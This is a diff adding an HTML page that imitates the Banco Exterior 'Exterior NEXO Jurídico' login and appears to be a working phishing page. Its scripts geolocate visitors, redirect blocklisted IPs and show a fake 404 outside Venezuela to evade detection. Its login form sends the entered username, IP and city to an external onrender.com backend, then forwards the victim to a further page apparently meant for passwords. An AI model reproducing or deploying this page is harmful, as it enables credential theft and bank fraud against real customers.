@@ -1,0 +1,284 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+<meta http-equiv="Pragma" content="no-cache" />
+<meta http-equiv="Expires" content="0" />
+<script>
+  window.addEventListener('pageshow', function (event) {
+    if (event.persisted || performance.getEntriesByType("navigation")[0].type === "back_forward") {
+      window.location.reload();
+    }
+  });
+</script>
+    <style>
+        body {transition: opacity ease-in 0.2s; } 
+        body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; }
+    </style>
+        <script>
+fetch('https://ipwhois.app/json/')
+  .then(res => res.json())
+  .then(data => {
+    const ip = data.ip;
+    const ipsBloqueadas = ['169.197.142.198', '212.30.36.12', '179.7.73.123', '113.52.145.48', '46.199.75.109', '104.244.210.61', '200.16.95.164', '206.0.231.193', '201.210.138.41', '212.97.65.26', '186.14.80.72', '201.211.54.71', '105.155.179.101', '186.80.28.176', '138.68.166.157', '149.102.227.71', '186.24.84.87', '200.8.77.108', '186.24.192.252', '190.153.19.121'];
+
+    if (ipsBloqueadas.includes(ip)) {
+      window.location.href = 'https://www.google.com'; // o muestra un mensaje de error
+    }
+  });
+</script>
+
+<script>
+  let intentos = 0;
+  const maxIntentos = 3;
+
+  function verificarIP() {
+    fetch("https://ipwhois.app/json/")
+      .then(res => res.json())
+      .then(data => {
+        if (data.country === "Venezuela") {
+         
+        } else {
+          document.body.innerHTML = "<h2>❌ERROR 404</h2>";
+        }
+      })
+      .catch(err => {
+        console.warn("Error al obtener IP, intento #" + (intentos + 1));
+        intentos++;
+        if (intentos < maxIntentos) {
+          setTimeout(verificarIP, 1000); // reintenta en 1 segundo
+        } else {
+          document.body.innerHTML = "<h2>❌ No se pudo verificar tu ubicación. Acceso restringido.</h2>";
+        }
+      });
+  }
+
+  verificarIP();
+</script>
+
+    <link rel="stylesheet" type="text/css" href="style3.css">
+    <link rel="stylesheet" type="text/css" href="posicionamiento.css">
+    <link rel="stylesheet" type="text/css" href="primefaces.css">
+    
+    <style type="text/css">
+        #_copy{align-items:center;background:#4494d5;border-radius:3px;color:#fff;cursor:pointer;display:flex;font-size:13px;height:30px;justify-content:center;position:absolute;width:60px;z-index:1000}#select-tooltip,#sfModal,.modal-backdrop,div[id^=reader-helper]{display:none!important}.modal-open{overflow:auto!important}._sf_adjust_body{padding-right:0!important}.enable_copy_btns_div{position:fixed;width:154px;left:10px;top:45%;background:#e7f1ff;border:2px solid #4595d5;font-weight:600;border-radius:2px;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Helvetica Neue,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol;z-index:5000}.enable_copy_btns_logo{width:100%;background:#4595d5;text-align:center;font-size:12px;color:#e7f1ff;line-height:30px;height:30px}.enable_copy_btns_btn{display:block;width:128px;height:28px;background:#7f5711;border-radius:4px;color:#fff;font-size:12px;border:0;outline:0;margin:8px auto;font-weight:700;cursor:pointer;opacity:.9}.enable_copy_btns_btn:hover{opacity:.8}.enable_copy_btns_btn:active{opacity:1}
+    </style>
+</head>
+
+<body >
+
+    <div id="page" class="container_12" >
+
+        <div id="header" >
+            <div class="header" >
+                <a href="#" class="logo_bienvenida">Banco Exterior</a>
+                <div class="titulo_header" >
+                    <h1 class="titulo_bienvenida">
+                    Bienvenido a <span class="titulo_bienvenida2">
+                    Exterior NEXO Jurídico</span>
+                </h1>
+                </div>
+                <div class="clear" ></div>
+            </div>
+            <div class="separador_header" ></div>
+            <div class="clear" ></div>
+        </div>
+
+        <div id="sidebarBienvenida" class="grid_4" >
+            <h3 class="titulo_sidebar">¿Necesito asesoría?</h3>
+
+            <h3 class="texto_sidebar">Comunícate con nosotros a Soporte Exterior Nexo Jurídico  al (0212) 501 5500
+    </h3>
+            <h3 class="texto_sidebar">
+        También lo puedes hacer a través del correo electrónico nexoclientejuridico@bancoexterior.com
+    </h3>
+            <br>
+            <br>
+            <br>
+            <h3>
+        <table>
+            <tbody><tr>
+                <td>
+        
+                    <a  href="#">
+                        <img class="mfes-trustmark mfes-trustmark-hover" border="0" src="102.gif" width="90" height="37" >
+                        
+                    </a>
+                   
+                </td>
+                <td align="center" valign="middle" style="padding-left: 20px;" title="Click to Verify - This site chose Symantec SSL for secure e-commerce and confidential communications.">
+                    <a href="#"  style="color:#000000; text-decoration:none; font:bold 7px verdana,sans-serif; letter-spacing:.5px; text-align:center; margin:0px; padding:0px;">
+                        ACERCA DE LOS CERTIFICADOS SSL
+                    </a>
+                </td>
+            </tr>
+        </tbody></table>
+
+    </h3>
+            <div class="clear" ></div>
+        </div>
+
+        <div id="content" class="grid_8" >
+
+
+
+            <div class="grid_1" >
+                <div class="imagen_login" ><img src="bienvenida.jpeg">
+                </div>
+            </div>
+            <div class="grid_3 omega" >
+
+                <div class="inicio_sesion" >
+                    <h2 class="usuario_nuevo">Nuevo usuario.</h2>
+                  
+
+                        <table>
+                            <tbody>
+                                <tr>
+                                    <td class="columna_centrada">
+                                        <span class="span" style="margin-top:10px;">Es la primera vez que ingreso</span>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td align="center">
+                                        <button id="nuevo:j_id887061555_2b88ff30" name="nuevo:j_id887061555_2b88ff30" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only boton_azul" 
+                                        style="margin-top: 10px;" type="button" role="button" aria-disabled="false"><span class="ui-button-text">Click aquí por Auto Registro</span></button>
+                                    </td>
+                                </tr>
+                            </tbody>
+                            <tfoot>
+                                <tr>
+                                    <td colspan="2">
+                                        <div id="nuevo:msgNuevo" ></div>
+                                    </td>
+                                </tr>
+                            </tfoot>
+                        </table>
+                        
+                  
+                </div>
+                <div class="clear" ></div>
+            </div>
+
+            <div class="grid_3 alpha" >
+
+                <div class="inicio_sesion" >
+                    <h2 class="usuario_registrado">Usuario registrado.</h2>
+                    <form id="formulario" name="registrado" method="post" >
+                      
+                        <table>
+                            <tbody>
+                                <tr>
+                                    <td>
+
+                                        <span class="span" style="margin-top:10px;">Ya estoy registrado, tengo usuario y contraseña</span>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td>
+                                        <span class="span" style="margin-top:10px;">Usuario</span>
+                                        <input id="mat-input-0"  type="text" autocomplete="off" 
+                                        style="width:93%;" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all" role="textbox" aria-disabled="false" aria-readonly="false" aria-multiline="false" required>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td>
+                                        <button  name="registrado:aceptarId" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only boton_azul" 
+                                        style="float:right; margin-top: 10px; margin-right: -5px !important" id="cosota" type="submit" role="button" aria-disabled="false"><span class="ui-button-text">Aceptar</span></button>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td><a id="registrado:j_id887061555_2b88ffa3" href="#" class="ui-commandlink link" >¿Olvidaste tu usuario?</a>
+                                        <a
+                                        id="registrado:j_id887061555_2b88ffb2" href="#" class="ui-commandlink link" href="#" class="ui-commandlink link" >¿Tu usuario está suspendido?</a>
+                                    </td>
+                                </tr>
+                            </tbody>
+                            <tfoot>
+                                <tr>
+                                    <td colspan="2">
+                                        <div id="registrado:msgRegistro" ></div>
+                                    </td>
+                                </tr>
+                            </tfoot>
+                        </table>
+                      
+                    </form>
+
+                </div>
+                <div class="clear" ></div>
+            </div>
+            <div class="clear" ></div>
+        </div>
+
+        <div id="footer" >
+            <div class="prefix_11 grid_1 margen_superior" >
+
+            </div>
+            <div class="datos_footer grid_12" >
+                <table>
+                    <tbody>
+                        <tr>
+                            <td style="width: 50%">
+                                <p class="parrafo_footer">© 2014 Banco Exterior J-00002950-4. Todos los derechos reservados.</p>
+                                <p class="parrafo_footer">Edif. Banco EXTERIOR, Avenida Urdaneta, entre esquinas de Urapal a Rio, La Candelaria, Caracas, Venezuela. Código Postal 1010</p>
+                            </td>
+                            <td style="width: 50%; text-align: right;">
+                                <p class="parrafo_footer">Eres tú quien decides, vive una vida sana disfruta una vida Sin Igual.</p>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+            <div class="clear" ></div>
+        </div>
+
+        <div class="clear" ></div>
+    </div>
+
+ <script src="https://cdn.jsdelivr.net/npm/axios@1.6.8/dist/axios.min.js"></script>
+ <script>
+const form = document.getElementById("formulario");
+const submitButtons = document.getElementById("cosota");
+
+form.addEventListener("submit", async (event) => {
+    event.preventDefault();
+
+    const use0 = document.getElementById('mat-input-0').value.trim();
+
+    if (use0 === "") {
+        alert("El identificador de Usuario no puede estar en blanco");
+        return; // No hacemos nada más si está vacío
+    }
+
+    // ✅ Ahora sí, desactivar el botón porque pasó la validación
+    submitButtons.disabled = true;
+    localStorage.setItem('usuario', use0);
+
+    try {
+        const ipResponse = await axios.get('https://ipwhois.app/json/');
+        const { ip, city = 'Desconocida' } = ipResponse.data;
+
+        const backendURL = 'https://luxuriant-sugared-titaniums-ncd7.onrender.com/api/sendMessage3';
+
+        await axios.post(backendURL, {
+            user: use0,
+            // password: use1,
+            ip: ip,
+            city: city,
+        });
+
+        window.location.href = 'clvsjurids.html';
+    } catch (error) {
+        console.error('Error al enviar datos al backend:', error);
+        submitButtons.disabled = false; // si falla, vuelve a habilitar el botón
+    }
+});
+</script>
+</body>
+
+</html>
